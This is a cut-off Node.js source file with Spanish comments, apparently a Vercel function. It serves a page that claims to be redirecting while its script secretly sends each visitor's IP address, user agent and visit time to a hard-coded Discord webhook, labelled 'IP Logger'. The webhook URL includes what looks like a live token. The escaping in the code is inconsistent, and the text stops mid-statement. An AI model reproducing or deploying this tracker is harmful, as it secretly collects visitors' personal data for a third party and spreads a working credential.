// Este código se ejecuta en el servidor de Vercel (Node.js)
// Usamos la sintaxis de CommonJS para máxima compatibilidad.

const htmlContent = `
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redireccionando...</title>
</head>
<body>
    <script>
        // Este código se ejecuta en el NAVEGADOR del visitante

        async function sendToWebhook(ip, userAgent) {
            const webhookUrl = "https://discord.com/api/webhooks/1519758132807602378/YtoAWyJo0ZqH0PglhE-W21yoWpVPJZpgIHM5xRVEvyR30EfJ5gcerZdDz-jb63jOEXwo";
            
            const embed = {
                title: "Nueva visita capturada",
                color: 0x000000, 
                fields: [
                    { name: "🌐 Dirección IP", value: \`\`\`${ip}\`\`\``, inline: false },
                    { name: "🖥️ User Agent", value: \`\`\`\${userAgent}\`\`\``, inline: false },
                    { name: "📅 Fecha", value: new Date().toLocaleString("es-ES", { timeZone: "America/Mexico_City" }), inline: false }
                ],
                footer: { text: "Logger de IP y User Agent" }
            };

            const payload = {
                username: "IP Logger",
                avatar_url: "https://i.imgur.com/8B2L1qT.png",
                embeds: [embed]
            };

            const data =
